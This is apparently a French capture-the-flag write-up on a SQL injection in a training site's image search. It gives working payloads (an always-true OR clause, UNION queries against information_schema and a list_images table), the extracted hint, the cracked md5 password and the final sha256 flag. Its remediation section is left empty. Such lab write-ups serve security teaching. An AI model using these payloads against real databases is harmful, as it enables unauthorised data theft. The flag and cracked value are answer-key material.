                SQL Injection (Images)

En faisaint une recher d'images on peut s'apercevoir que celle ci est vulnérable à une injection SQL,
en tapant 1 OR 1=1 on peut voir que la requête retourne toutes les images de la base de données.

1 OR 1 = 1 est une expression booléenne qui est toujours vraie, donc a partir d'une requetes que l'on peut imaginer comme celle ci:

SELECT id, title, url FROM images WHERE id = $_GET['id']

qui va donc donner : 

SELECT id, title, url FROM images WHERE id = 1 OR 1 = 1;

qui va donc retourner tous les membres de la base de données.

L'opérateur UNION permet de combiner les résultats de plusieurs requêtes SQL en une seule.
On peut faire une requête de ce type pour récupérer le nom de la table et des colonnes de la base de données:
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns;

On peut voir une table qui s'appele : "list_images" avec une column interessante : "comment", donc comme dans la faille avec la recherche de membre
on peut  attaquer par ca :
1 or 1=1 UNION select url, comment from list_images

ID: 1 or 1=1 UNION select url, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png

Donc meme procede que pour les menbres :

md5 -> albatroz
albatroz en Sh256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Risque :
- Un attaquant peut recuperer des informations confidentielles dans la base de données

Solution :


